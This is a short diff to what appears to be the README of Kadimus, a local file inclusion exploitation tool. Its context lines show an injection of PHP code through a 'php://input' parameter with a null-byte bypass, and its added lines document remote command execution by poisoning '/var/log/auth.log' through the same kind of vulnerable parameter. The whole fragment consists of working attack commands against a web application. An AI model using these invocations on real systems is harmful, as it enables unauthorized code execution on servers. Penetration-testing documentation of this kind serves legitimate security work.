@@ -108,3 +108,8 @@ $ make
 ```
 ./kadimus -t localhost/?pg=php://input%00 -C '<?php echo "pwned"; ?>' -X input
 ```
+
+### Execute command:
+```
+./kadimus -t localhost/?pg=/var/log/auth.log -X auth -c 'ls -lah'
+```
